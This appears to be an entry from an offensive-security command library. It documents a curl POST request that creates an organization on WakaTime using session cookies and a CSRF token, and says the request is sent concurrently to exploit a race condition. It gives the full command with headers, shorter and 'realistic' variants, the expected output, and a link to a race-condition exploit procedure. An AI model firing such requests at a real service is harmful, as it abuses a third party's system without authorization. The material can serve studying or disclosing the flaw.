---
data: >-
  curl -X POST 'https://wakatime.com/settings/orgs/new' -H 'Cookie:
  csrftoken=c25cc215f903abf846b48d367d927846cef87dfdf937fb24a5ea5608a5a4ac55;
  session=...; ...' -H 'Content-Type: application/x-www-form-urlencoded' -d
  'csrftoken=c25cc215f903abf846b48d367d927846cef87dfdf937fb24a5ea5608a5a4ac55&name=ctrl2'
tags:
  - web-exploit
  - post-request
type: command
output: HTTP/1.1 200 OK or redirect to success page; body indicates creation success.
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:22.640Z'
id: bedc86ae-060d-4130-ba35-1dd17bc14268
verified: false
validated: true
submitted: true
---
# create-wakatime-organization-post

## Command

```bash
curl -X POST 'https://wakatime.com/settings/orgs/new' \
  -H 'Cookie: csrftoken=c25cc215f903abf846b48d367d927846cef87dfdf937fb24a5ea5608a5a4ac55; session=...; ...; github_csrf_token=...; remember_token=...' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Referer: https://wakatime.com/settings/orgs/new' \
  -d 'csrftoken=c25cc215f903abf846b48d367d927846cef87dfdf937fb24a5ea5608a5a4ac55&name=ctrl2'
```

## Description

This command sends a POST request to WakaTime's organization creation endpoint to create an organization with the specified name. It is used in the context of exploiting a race condition by sending multiple instances concurrently. Requires valid session cookies and CSRF token from a logged-in session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `https://wakatime.com/settings/orgs/new` | Target endpoint URL | Yes |
| `-H 'Cookie: ...'` | Session and CSRF cookies for authentication | Yes |
| `-H 'Content-Type: ...'` | Form data encoding | Yes |
| `-d 'csrftoken=...&name=ctrl2'` | Request body with CSRF token and organization name | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://wakatime.com/settings/orgs/new' -H 'Cookie: ...' -H 'Content-Type: application/x-www-form-urlencoded' -d 'csrftoken=...&name=ctrl2'
```

### Advanced Usage (with full headers for realism)

```bash
curl -X POST 'https://wakatime.com/settings/orgs/new' \
  -H 'Cookie: csrftoken=...; session=...' \
  -H 'User-Agent: Mozilla/5.0 ...' \
  -H 'Referer: https://wakatime.com/settings/orgs/new' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'csrftoken=...&name=ctrl2'
```

## Expected Output

Successful response: HTTP 200 OK or 302 redirect to organization dashboard, with body or headers indicating creation success. In race scenarios, multiple successes despite duplicates.

## Related

- [[Related Procedure: Exploit-WakaTime-Organization-Race-Condition]]
